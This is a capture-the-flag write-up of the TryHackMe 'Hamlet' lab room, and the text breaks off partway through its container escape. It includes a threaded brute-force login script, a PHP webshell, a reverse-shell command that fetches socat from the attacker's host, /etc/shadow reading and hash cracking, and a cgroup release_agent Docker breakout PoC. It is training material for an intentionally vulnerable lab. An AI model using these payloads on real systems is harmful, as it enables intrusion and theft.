# Hamlet

## Introduction

Welcome to my another writeup! In this TryHackMe [Hamlet](https://tryhackme.com/room/hamlet) room, you'll learn: Enumeration, uploading PHP webshell, Docker breakout and more! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★★★★★★☆☆☆

## Table of Content

1. **[Service Enumeration](#service-enumeration)**
2. **[Initial Foothold](#initial-foothold)**
3. **[Privilege Escalation: Docker www-data to Docker root](#privilege-escalation)**
4. **[Privilege Escalation: Docker root to Host root](#docker-root-to-host-root)**
5. **[Conclusion](#conclusion)**

## Background

> A Shakespeare/Hamlet-inspired room in which you will explore an uncommon web application used in linguistic/NLP research.
> 
> Difficulty: Medium

---

Welcome to **Hamlet**!

This is a fairly straightforward CTF-like room in which you will play with an uncommon web application used in linguistic research. You will also learn a little bit about Docker. While there are CTF elements, there are quite a few "real" problems in here. Feel free to explore!

In the [associated GitHub repository](https://github.com/IngoKl/THM-Hamlet), you will find detailed information about this room as well as the learning objectives. That said, I would recommend trying this room as a challenge first.

There's a total of **six flags**. You don't necessarily have to find them in order. (**Flags:** THM{flag})

## Service Enumeration

As usual, scan the machine for open ports via `rustscan`!

**Rustscan:**
```shell
┌[root♥siunam]-(~/ctf/thm/ctf/Hamlet)-[2023.01.18|14:02:57]
└> export RHOSTS=10.10.207.238
┌[root♥siunam]-(~/ctf/thm/ctf/Hamlet)-[2023.01.18|14:03:04]
└> rustscan --ulimit 5000 -b 4500 -t 2000 --range 1-65535 $RHOSTS -- -sC -sV -oN rustscan/rustscan.txt
[...]
PORT      STATE  SERVICE     REASON         VERSION
21/tcp    open   ftp         syn-ack ttl 63 vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.0.253
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rwxr-xr-x    1 0        0             113 Sep 15  2021 password-policy.md
|_-rw-r--r--    1 0        0            1425 Sep 15  2021 ufw.status
22/tcp    open   ssh         syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a0ef4c3228a64c7f60d6a66332acab27 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC5/i3O28uWolhittypXr6mAEk+XOV998o/e/3wIWpGq9J1GhtGc3J4uwYpBt7SiS3mZivq9D5jgFhqhHb6zlBsQmGUnXUnQNYyqrBmGnyl4urp5IuV1sRCdNXQdt/lf6Z9A807OPuCkzkAexFUV28eXqdXpRsXXkqgkl5DCm2WEtV7yxPIbGlcmX+arDT9A5kGTZe9rNDdqzSafz0aVKRWoTHGHuqVmq0oPD3Cc3oYfoLu7GTJV+Cy6Hxs3s6oUVcruoi1JYvbxC9whexOr+NSZT9mGxDSDLS6jEMim2DQ+hNhiT49JXcMXhQ2nOYqBXLZF0OYyNKaGdgG35CIT40z
|   256 5a6d1a399700bec7106e365c7fcadcb2 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHtt/3Q8agNKO48Zw3srosCs+bfCx47O+i4tBUX7VGMSpzTJQS3s4DBhGvrvO+d/u9B4e9ZBgWSqo+aDqGsTZxQ=
|   256 0b7740b2cc308d8e4551fa127ce295c7 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIN4jv01JeDGsDfhWIJMF8HBv26FI18VLpBeNoiSGbKVp
80/tcp    open   http        syn-ack ttl 63 lighttpd 1.4.45
|_http-server-header: lighttpd/1.4.45
|_http-title: Hamlet Annotation Project
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
501/tcp   open   nagios-nsca syn-ack ttl 63 Nagios NSCA
8000/tcp  open   http        syn-ack ttl 62 Apache httpd 2.4.48 ((Debian))
|_http-server-header: Apache/2.4.48 (Debian)
|_http-open-proxy: Proxy might be redirecting requests
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Site doesn't have a title (text/html).
8080/tcp  open   http-proxy  syn-ack ttl 62
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 500 
|     Content-Type: application/json;charset=UTF-8
|     Date: Wed, 18 Jan 2023 06:05:07 GMT
|     Connection: close
|     {"timestamp":1674021907270,"status":500,"error":"Internal Server Error","exception":"org.springframework.security.web.firewall.RequestRejectedException","message":"The request was rejected because the URL contained a potentially malicious String "%2e"","path":"/nice%20ports%2C/Tri%6Eity.txt%2ebak"}
|   GetRequest: 
|     HTTP/1.1 302 
|     Set-Cookie: JSESSIONID=40BB25E12B1EC4E7D241C9B7C6B79032; Path=/; HttpOnly
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     Cache-Control: no-cache, no-store, max-age=0, must-revalidate
|     Pragma: no-cache
|     Expires: 0
|     X-Frame-Options: SAMEORIGIN
|     Location: http://localhost:8080/login.html
|     Content-Length: 0
|     Date: Wed, 18 Jan 2023 06:05:00 GMT
|     Connection: close
|   HTTPOptions: 
|     HTTP/1.1 302 
|     Set-Cookie: JSESSIONID=933C165D5261D913C18C2B77A403FCE0; Path=/; HttpOnly
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     Cache-Control: no-cache, no-store, max-age=0, must-revalidate
|     Pragma: no-cache
|     Expires: 0
|     X-Frame-Options: SAMEORIGIN
|     Location: http://localhost:8080/login.html
|     Content-Length: 0
|     Date: Wed, 18 Jan 2023 06:05:02 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Wed, 18 Jan 2023 06:05:02 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|_    Request</h1></body></html>
| http-title: WebAnno - Log in 
|_Requested resource was http://10.10.207.238:8080/login.html
|_http-favicon: Spring Java Framework
|_http-open-proxy: Proxy might be redirecting requests
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-trane-info: Problem with XML parsing of /evox/about
[...]
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

According to `rustscan` result, we have 6 ports are opened:

|Open Port         | Service                       |
|:---:             |:---:                          |
|21                | vsftpd 3.0.3                  |
|22                | OpenSSH 7.6p1 Ubuntu          |
|80                | lighttpd 1.4.45               |
|501               | Nagios NSCA                   |
|8000              | Apache httpd 2.4.48 ((Debian))|
|8080              | HTTP                          |

### FTP on Port 21

**Let's try `anonymous` login:**
```shell
┌[root♥siunam]-(~/ctf/thm/ctf/Hamlet)-[2023.01.18|14:03:04]
└> ftp $RHOSTS
Connected to 10.10.207.238.
220 (vsFTPd 3.0.3)
Name (10.10.207.238:nam): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```

We can login as `anonymous`!

**Enumerating FTP:**
```shell
ftp> ls -lah
229 Entering Extended Passive Mode (|||50418|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        114          4096 Sep 15  2021 .
drwxr-xr-x    2 0        114          4096 Sep 15  2021 ..
-rwxr-xr-x    1 0        0             113 Sep 15  2021 password-policy.md
-rw-r--r--    1 0        0            1425 Sep 15  2021 ufw.status
```

- Found 2 files: `password-policy.md`, `ufw.status`

**Let's download them!**
```shell
ftp> prompt off
Interactive mode off.
ftp> mget *
```

```markdown
┌[root♥siunam]-(~/ctf/thm/ctf/Hamlet)-[2023.01.18|14:06:43]
└> cat password-policy.md 
# Password Policy

## WebAnno

New passwords should be:

- lowercase
- between 12 and 14 characters long
```

**In here, we see the password policy:**

- Lowercase
- Between 12 and 14 characters long

We can create a wordlist to brute force something later on.

```shell
┌[root♥siunam]-(~/ctf/thm/ctf/Hamlet)-[2023.01.18|14:06:46]
└> cat ufw.status        
Status: active

To                         Action      From
--                         ------      ----
20/tcp                     ALLOW       Anywhere                  
21/tcp                     ALLOW       Anywhere                  
22/tcp                     ALLOW       Anywhere                  
80/tcp                     ALLOW       Anywhere                  
501/tcp                    ALLOW       Anywhere                  
8080/tcp                   ALLOW       Anywhere                  
8000/tcp                   ALLOW       Anywhere                  
1603/tcp                   ALLOW       Anywhere                  
1564/tcp                   ALLOW       Anywhere                  
50000:50999/tcp            ALLOW       Anywhere                  
20/tcp (v6)                ALLOW       Anywhere (v6)             
21/tcp (v6)                ALLOW       Anywhere (v6)             
22/tcp (v6)                ALLOW       Anywhere (v6)             
80/tcp (v6)                ALLOW       Anywhere (v6)             
501/tcp (v6)               ALLOW       Anywhere (v6)             
8080/tcp (v6)              ALLOW       Anywhere (v6)             
8000/tcp (v6)              ALLOW       Anywhere (v6)             
1603/tcp (v6)              ALLOW       Anywhere (v6)             
1564/tcp (v6)              ALLOW       Anywhere (v6)             
50000:50999/tcp (v6)       ALLOW       Anywhere (v6)
```

The UFW (Uncomplicated Firewall) allows many incoming connections in those ports.

### HTTP on Port 80

**Adding a new host to `/etc/hosts`:**
```shell
┌[root♥siunam]-(~/ctf/thm/ctf/Hamlet)-[2023.01.18|14:10:46]
└> echo "$RHOSTS hamlet.thm" >> /etc/hosts
```

**Flag 1:**
```shell
┌[root♥siunam]-(~/ctf/thm/ctf/Hamlet)-[2023.01.18|14:13:18]
└> curl http://hamlet.thm/robots.txt
User-agent: *
Allow: /

THM{1_Redacted}
```

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Hamlet/images/Pasted%20image%2020230118141308.png)

> We are a small group of researchers annotating Shakespeare's _Hamlet_ using _WebAnno_.

**WebAnno** is a general purpose web-based annotation tool for a wide range of linguistic annotations including various layers of morphological, syntactical, and semantic annotations. Additionaly, custom annotation layers can be defined, allowing WebAnno to be used also for non-linguistic annotation tasks.

**The version of the play: `hamlet.txt`**
```shell
┌[root♥siunam]-(~/ctf/thm/ctf/Hamlet)-[2023.01.18|14:16:36]
└> curl http://hamlet.thm/hamlet.txt
***The Project Gutenberg's Etext of Shakespeare's First Folio***
*********************The Tragedie of Hamlet*********************

This is our 3rd edition of most of these plays.  See the index.


Copyright laws are changing all over the world, be sure to check
the copyright laws for your country before posting these files!!

Please take a look at the important information in this header.
We encourage you to keep this file on your own disk, keeping an
electronic path open for the next readers.  Do not remove this.


**Welcome To The World of Free Plain Vanilla Electronic Texts**
[...]
```

**Hmm... No clue what is it. We can `wget` it for later use:**
```shell
┌[root♥siunam]-(~/ctf/thm/ctf/Hamlet)-[2023.01.18|14:17:43]
└> wget http://hamlet.thm/hamlet.txt
```

We also found there is a user called Michael 'ghost' Canterbury, and a subdomain `webanno.hamlet.thm`.

**We can add that to our `/etc/hosts`:**
```shell
┌[root♥siunam]-(~/ctf/thm/ctf/Hamlet)-[2023.01.18|14:22:00]
└> nano /etc/hosts
10.10.207.238 hamlet.thm webanno.hamlet.thm
```

### Nagios NSCA on Port 501

```shell
┌[root♥siunam]-(~/ctf/thm/ctf/Hamlet)-[2023.01.18|14:23:42]
└> nc -nv $RHOSTS 501
(UNKNOWN) [10.10.207.238] 501 (?) open
GRAVEDIGGER
What do you call a person who builds stronger things than a stonemason, a shipbuilder, or a carpenter does?
PENTESTER
hello?
she finde him not,
To England se
PENTESTER
```

> "What do you call a person who builds stronger things than a stonemason, a shipbuilder, or a carpenter does?"

Also, those lines are from the `hamlet.txt`.

**In the `hamlet.txt`, we can find the answer:**
```
[...]
   Clo. What is he that builds stronger then either the
Mason, the Shipwright, or the Carpenter?
  Other. The Gallowes maker; for that Frame outliues a
thousand Tenants

   Clo. I like thy wit well in good faith, the Gallowes
does well; but how does it well? it does well to those
that doe ill: now, thou dost ill to say the Gallowes is
built stronger then the Church: Argall, the Gallowes
may doe well to thee. Too't againe, Come
[...]
```

**Hence the answer is `Galloes`:** (Flag 2)
```
┌[root♥siunam]-(~/ctf/thm/ctf/Hamlet)-[2023.01.18|14:24:13]
└> nc -nv $RHOSTS 501
(UNKNOWN) [10.10.207.238] 501 (?) open
GRAVEDIGGER
What do you call a person who builds stronger things than a stonemason, a shipbuilder, or a carpenter does?
PENTESTER
?
uit in answer of the third exchange,
Let all the
PENTESTER
gallows
THM{2_Redacted}
```

### HTTP on Port 8000

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Hamlet/images/Pasted%20image%2020230118142854.png)

**In here, it has an `<iframe>` element, and the `src` attribute is pointing to `/repository/project/0/document/0/source/hamlet.txt`:**
```html
<iframe style="width:100%; height:100%" src="/repository/project/0/document/0/source/hamlet.txt"></iframe>
```

This `hamlet.txt` is the same as the `hamlet.txt` that we've found in port 80.

### HTTP on Port 8080

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Hamlet/images/Pasted%20image%2020230118144051.png)

When I go to `/`, it redirects me to `/login.html`.

In here, we see it's using WebAnno version 3.6.7. However, I don't see any public exploit for that.

Now, we can try to login as user `michael`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Hamlet/images/Pasted%20image%2020230118144917.png)

When we typed an invalid username or password, it outputs `Login failed`.

In Burp Suite HTTP history, when we clicked the "Log in" button, it'll send a POST request to `/login.html?-1.-loginForm`, with parameter `urlfragment`, `username`, `password`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Hamlet/images/Pasted%20image%2020230118145057.png)

## Initial Foothold

Armed with above information, we can create our own password wordlist from `hamlet.txt`, which has between 12 and 14 characters long and all lowercase (From `password-policy.md`):

```shell
┌[root♥siunam]-(~/ctf/thm/ctf/Hamlet)-[2023.01.18|14:56:46]
└> cewl http://hamlet.thm/hamlet.txt -w wordlist_hamlet.txt
CeWL 5.5.2 (Grouping) Robin Wood (robin@digi.ninja) (https://digi.ninja/)

┌[root♥siunam]-(~/ctf/thm/ctf/Hamlet)-[2023.01.18|14:57:11]
└> awk 'length >= 12 && length <= 14' wordlist_hamlet.txt > password_hamlet.txt
```

Then brute force it.

**However, instead of using `hydra`, I'll write a Python script to do that, as I wanna get better for my Python skill:**
```py
#!/usr/bin/env python3

import requests
from threading import Thread
from time import sleep

class Bruteforcer:
    def __init__(self, url, username):
        self.__url = url
        self.__username = username

    def sendRequest(self, password):
        loginData = {
            'urlfragment': '',
            'username': self.__username,
            'password': password
        }

        requestResult = requests.post(self.__url, data=loginData)
        print(f'[*] Trying password: {password:15s}', end='\r')

        if 'Login failed' not in requestResult.text:
            print(f'[+] Found valid credentials: {self.__username}:{password}')
            exit()

def main():
    url = 'http://hamlet.thm:8080/login.html?-1.-loginForm'
    username = 'ghost'
    bruteforcer = Bruteforcer(url, username)
    
    wordlist = 'password_hamlet.txt'

    with open(wordlist, 'r') as file:
        for line in file:
            password = line.strip()

            thread = Thread(target=bruteforcer.sendRequest, args=(password,))
            thread.start()

            # You can adjust how fast of each thread.
            # 0.2s is recommended. Otherwise it'll break target's WebAnno.
            sleep(0.2)

if __name__ == '__main__':
    main()
```

```shell
┌[root♥siunam]-(~/ctf/thm/ctf/Hamlet)-[2023.01.18|15:42:36]
└> python3 bruteforcer.py
[+] Found valid credentials: ghost:{Redacted}
```

**Found it! Let's login as user `ghost`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Hamlet/images/Pasted%20image%2020230118154549.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Hamlet/images/Pasted%20image%2020230118154556.png)

Then enumerate the admin panel!

- Annotation:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Hamlet/images/Pasted%20image%2020230118154813.png)

Nothing weird.

- Projects:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Hamlet/images/Pasted%20image%2020230118154854.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Hamlet/images/Pasted%20image%2020230118155110.png)

- Found 3 users: `admin`, `ghost`, `ophella`

**We can try to brute force them at SSH:**
```shell
┌[root♥siunam]-(~/ctf/thm/ctf/Hamlet)-[2023.01.18|15:52:31]
└> cat user.txt
admin
ghost
ophella

┌[root♥siunam]-(~/ctf/thm/ctf/Hamlet)-[2023.01.18|15:52:37]
└> hydra -L user.txt -P password_hamlet.txt ssh://$RHOSTS 
[...]
[ERROR] target ssh://10.10.207.238:22/ does not support password authentication (method reply 4).
```

Hmm... Their SSH doesn't support password authetication, which means it only support public/private SSH key to login.

I also tried to brute force the WebAnno login page, but no luck.

- Users:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Hamlet/images/Pasted%20image%2020230118160004.png)

We already found those 3 users in "Projects".

However, we can change their password!

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Hamlet/images/Pasted%20image%2020230119115317.png)

Let's change their password and login!

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Hamlet/images/Pasted%20image%2020230119115341.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Hamlet/images/Pasted%20image%2020230119115400.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Hamlet/images/Pasted%20image%2020230119115416.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Hamlet/images/Pasted%20image%2020230119115435.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Hamlet/images/Pasted%20image%2020230119115444.png)

In "Curation", we found something interesting:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Hamlet/images/Pasted%20image%2020230119115700.png)

We found user `ophelia` password!

**Now, we can try to do a password spraying in FTP:**
```shell
┌[root♥siunam]-(~/ctf/thm/ctf/Hamlet)-[2023.01.19|11:59:32]
└> hydra -L user.txt -p '{Redacted}' ftp://$RHOSTS 
[...]
[21][ftp] host: 10.10.207.238   login: ophelia   password: {Redacted}
```

Found user `ophelia`'s password in FTP!

**Then FTP into user `ophelia`:**
```shell
┌[root♥siunam]-(~/ctf/thm/ctf/Hamlet)-[2023.01.19|11:59:40]
└> ftp $RHOSTS                                               
Connected to 10.10.207.238.
220 (vsFTPd 3.0.3)
Name (10.10.207.238:nam): ophelia
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -lah
229 Entering Extended Passive Mode (|||50496|)
150 Here comes the directory listing.
drwxr-xr-x    2 1001     1001         4096 Sep 15  2021 .
drwxr-xr-x    5 0        0            4096 Sep 15  2021 ..
-rw-r--r--    1 1001     1001           31 Sep 16  2021 flag
```

**Let's get that `flag` file!**
```shell
ftp> get flag
```

**Flag 3:**
```shell
┌[root♥siunam]-(~/ctf/thm/ctf/Hamlet)-[2023.01.19|12:01:01]
└> cat flag        
THM{3_Redacted}
```

**After poking around at the admin panel, I found that we can upload any files to project "Hamlet" in "Documents" tab:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Hamlet/images/Pasted%20image%2020230119110041.png)

**Let's try to upload a PHP web shell!**
```shell
┌[root♥siunam]-(~/ctf/thm/ctf/Hamlet)-[2023.01.19|10:41:38]
└> echo -n '<?php system($_GET["cmd"]); ?>' > webshell.php
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Hamlet/images/Pasted%20image%2020230119110116.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Hamlet/images/Pasted%20image%2020230119110124.png)

We uploaded a PHP web shell!

But, where does the file lives??

Let's take a step back.

**In HTTP on port 8000, we found there is an `<iframe>` element, and it's `src` attribute is pointing to `/repository/project/0/document/0/source/hamlet.txt`:**
```html
<iframe style="width:100%; height:100%" src="/repository/project/0/document/0/source/hamlet.txt"></iframe>
```

Let's google that path!

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Hamlet/images/Pasted%20image%2020230119110359.png)

**In this [Gitter](https://gitter.im/webanno/webanno?at=595e380f0de4d2545efd4275) post, it has this:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Hamlet/images/Pasted%20image%2020230119110528.png)

Hence, the `<iframe>` element can be break down to:

- `/repository/project/`
- projectId = `0`
- `/document/`
- documentId = `0`
- `/source/hamlet.txt`

Armed with above information, we can try to add 1 to the documentId. Just like an IDOR (Insecure Direct Object Referenece) vulnerability:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Hamlet/images/Pasted%20image%2020230119110821.png)

Nice! We can now execute our PHP web shell:

```shell
┌[root♥siunam]-(~/ctf/thm/ctf/Hamlet)-[2023.01.19|11:02:40]
└> curl hamlet.thm:8000/repository/project/0/document/2/source/webshell.php --get --data-urlencode "cmd=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Let's get a reverse shell!**

- Setup a listener: (I'm using `socat` for stable shell)

```shell
┌[root♥siunam]-(~/ctf/thm/ctf/Hamlet)-[2023.01.19|11:08:50]
└> socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:443
2023/01/19 11:09:36 socat[26679] N opening character device "/dev/pts/1" for reading and writing
2023/01/19 11:09:36 socat[26679] N listening on AF=2 0.0.0.0:443
```

```shell
┌[root♥siunam]-(/opt/static-binaries/binaries/linux/x86_64)-[2023.01.19|11:09:55]-[git://master ✗]
└> python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

- Send the reverse shell payload:

```shell
┌[root♥siunam]-(~/ctf/thm/ctf/Hamlet)-[2023.01.19|11:10:17]
└> curl hamlet.thm:8000/repository/project/0/document/2/source/webshell.php --get --data-urlencode "cmd=curl http://10.9.0.253/socat -o /tmp/socat;chmod +x /tmp/socat;/tmp/socat TCP:10.9.0.253:443 EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane"
```

```shell
┌[root♥siunam]-(~/ctf/thm/ctf/Hamlet)-[2023.01.19|11:08:50]
└> socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:443
2023/01/19 11:09:36 socat[26679] N opening character device "/dev/pts/1" for reading and writing
2023/01/19 11:09:36 socat[26679] N listening on AF=2 0.0.0.0:443
                                                                2023/01/19 11:11:02 socat[26679] N accepting connection from AF=2 10.10.207.238:49548 on AF=2 10.9.0.253:443
                                                               2023/01/19 11:11:02 socat[26679] N starting data transfer loop with FDs [5,5] and [7,7]
                                           www-data@66505608bd11:/var/www/html/repository/project/0/document/2/source$ 
www-data@66505608bd11:/var/www/html/repository/project/0/document/2/source$ export TERM=xterm-256color
www-data@66505608bd11:/var/www/html/repository/project/0/document/2/source$ stty rows 22 columns 107
www-data@66505608bd11:/var/www/html/repository/project/0/document/2/source$ ^C
www-data@66505608bd11:/var/www/html/repository/project/0/document/2/source$ 
www-data@66505608bd11:/var/www/html/repository/project/0/document/2/source$ whoami;hostname;id;hostname -i
www-data
66505608bd11
uid=33(www-data) gid=33(www-data) groups=33(www-data)
172.17.0.2
```

I'm user `www-data`!

**Flag 4:**
```shell
www-data@66505608bd11:/var/www/html/repository/project/0/document/2/source$ cat /stage/flag 
THM{4_Redacted}
```

### Docker www-data to Host root

Let's do some basic enumerations!

**In `/`, we found there is a `.dockerenv` file:**
```shell
www-data@66505608bd11:/var/www/html/repository/project/0/document/2/source$ ls -lah /
total 88K
drwxr-xr-x   1 root root 4.0K Sep 15  2021 .
drwxr-xr-x   1 root root 4.0K Sep 15  2021 ..
-rwxr-xr-x   1 root root    0 Sep 15  2021 .dockerenv
[...]
```

Also, our `hostname -i` command outputs `172.17.0.2`, which indicates that **this is a Docker container instance**.

**SUID binaries:**
```shell
www-data@66505608bd11:/var/www/html/repository/project/0/document/2/source$ find / -perm -4000 2>/dev/null
/bin/umount
/bin/mount
/bin/cat
/bin/su
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/chsh
```

As you can see, `/bin/cat` has SUID sticky bit.

Since target's SSH service is enabled, we can try to `cat` root's private SSH key!

```shell
www-data@66505608bd11:/var/www/html/repository/project/0/document/2/source$ /bin/cat /root/.ssh/id_rsa
/bin/cat: /root/.ssh/id_rsa: No such file or directory
```

Nope.

**Uhh. Let's `cat` the `/etc/shadow` file, and crack root's password hash:**
```shell
www-data@66505608bd11:/var/www/html/repository/project/0/document/2/source$ /bin/cat /etc/shadow
root:$y$j9T${Redacted}:18885:0:99999:7:::
[...]
```

```shell
┌[root♥siunam]-(~/ctf/thm/ctf/Hamlet)-[2023.01.19|11:23:14]
└> nano root.hash

┌[root♥siunam]-(~/ctf/thm/ctf/Hamlet)-[2023.01.19|11:23:53]
└> john --wordlist=/usr/share/wordlists/rockyou.txt root.hash
Using default input encoding: UTF-8
No password hashes loaded (see FAQ)
```

Hmm...

Let's google that `$y$` to see which hashing algorithm is using:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Hamlet/images/Pasted%20image%2020230119121320.png)

**This StackOverflow [post](https://security.stackexchange.com/questions/248994/can-anyone-identify-the-y-hash-prefix-or-identify-what-hash-this-could-be) has an answer for us:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Hamlet/images/Pasted%20image%2020230119121357.png)

So this `$y$` is a yescrypt hash.

**Also, this StackExchange [post](https://security.stackexchange.com/questions/252665/does-john-the-ripper-not-support-yescrypt) tells us which format we need to use in `john`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Hamlet/images/Pasted%20image%2020230119121542.png)

**Let's crack it:**
```shell
┌[root♥siunam]-(~/ctf/thm/ctf/Hamlet)-[2023.01.19|12:12:14]
└> john --wordlist=/usr/share/wordlists/rockyou.txt --format=crypt root.hash
[...]
{Redacted}           (root)
```

**Cracked! Let's Switch User to `root`:**
```shell
www-data@66505608bd11:/var/www/html/repository/project/0/document/2/source$ su root
Password: 
root@66505608bd11:/var/www/html/repository/project/0/document/2/source# whoami;hostname;id;hostname -i
root
66505608bd11
uid=0(root) gid=0(root) groups=0(root)
172.17.0.2
```

I'm Docker container's root!

**Flag 5:**
```shell
root@66505608bd11:/tmp# cat /root/.flag 
THM{5_Redacted}
```

### Docker root to Host root

**LinPEAS:**
```shell
┌[root♥siunam]-(/usr/share/peass/linpeas)-[2023.01.19|11:31:56]
└> python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```shell
root@66505608bd11:/var/www/html/repository/project/0/document/2/source# curl -s http://10.9.0.253/linpeas.sh | sh
[...]
═══════════════════════════════════╣ Container ╠═══════════════════════════════════
                                   ╚═══════════╝
╔══════════╣ Container related tools present
╔══════════╣ Am I Containered?
╔══════════╣ Container details
═╣ Is this a container? ........... docker
═╣ Any running containers? ........ No
╔══════════╣ Docker Container details
═╣ Am I inside Docker group ....... No
═╣ Looking and enumerating Docker Sockets
═╣ Docker version ................. Not Found
═╣ Vulnerable to CVE-2019-5736 .... Not Found
═╣ Vulnerable to CVE-2019-13139 ... Not Found
═╣ Rootless Docker? ................ No

╔══════════╣ Container & breakout enumeration
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout
═╣ Container ID ................... 66505608bd11═╣ Container Full ID .............. 66505608bd11271b2e36d77b954371b99cfc712ba9fce1da0c6686df698188bb
═╣ Seccomp enabled? ............... disabled
═╣ AppArmor profile? .............. unconfined
═╣ User proc namespace? ........... enabled
═╣ Vulnerable to CVE-2019-5021 .... No

══╣ Breakout via mounts
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation/sensitive-mounts
═╣ release_agent breakout 1........ Yes
[...]
```

As you can see, **this Docker container is vulnerable to `release_agent` breakout 1.**

According to [HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#privileged-escape-abusing-release_agent-poc1), we can escape this Docker container via:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Hamlet/images/Pasted%20image%2020230119114017.png)

```bash
# spawn a new container to exploit via:
# docker run --rm -it --privileged ubuntu bash

# Finds + enables a cgroup release_agent
# Looks for something like: /sys/fs/cgroup/*/release_agent
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
# If "d" is empty, this won't work, you need to use the next PoC

# Enables notify_on_release in the cgroup
mkdir -p $d/w;
echo 1 >$d/w/notify_on_release
# If you have a "Read-only file system" error, you need to use the next PoC

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
t=`sed -n 's/overlay \/ .*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
touch /o; echo $t/c > $d/release_agent

# Creates a payload
echo "#!/bin/sh" > /c
echo "ps > $t/o" >> /c
chmod +x /c

# Triggers the cgroup via empty cgroup.procs
sh -c "echo 0 > $d/w/cgroup.procs"; sleep 1

# Reads the output
cat /o
```

**Let's copy and paste that:**
```shell
root@66505608bd11:/tmp# cat << EOF > /tmp/release_agent_breakout_1.sh
> d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`

mkdir -p $d/w;
echo 1 >$d/w/notify_on_release

t=`sed -n 's/overlay \/ .*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

touch /o; echo $t/c > $d/release_agent

